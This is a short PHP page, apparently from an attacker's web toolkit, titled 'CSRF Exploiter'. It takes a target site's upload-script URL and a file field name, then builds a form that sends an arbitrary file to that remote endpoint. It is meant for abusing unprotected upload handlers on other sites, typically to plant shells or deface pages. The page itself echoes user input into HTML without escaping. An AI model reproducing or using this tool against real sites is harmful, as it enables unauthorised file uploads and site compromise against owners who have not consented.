<title>CSRF Exploiter</title>
<?php
include("../head.php");
?>

<?php
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter </h1><br><br>
<font size="3">*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc</font>
<br><br>
<form method="post" style="font-size:25px;">
URL: <input type="text" class="con7" name="url" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
POST File: <input type="text" class="con7" name="pf" placeholder="Lihat diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
<input type="submit" class="kntd" name="d" value="Lock!">
</form>';
$url = $_POST["url"];
$pf = $_POST["pf"];
$d = $_POST["d"];
if($d) {
	echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' class='kntd' name='$pf'><input class='kntd' type='submit' name='g' value='Upload'></form></form>
</html>";
}
        ?>
<br><br>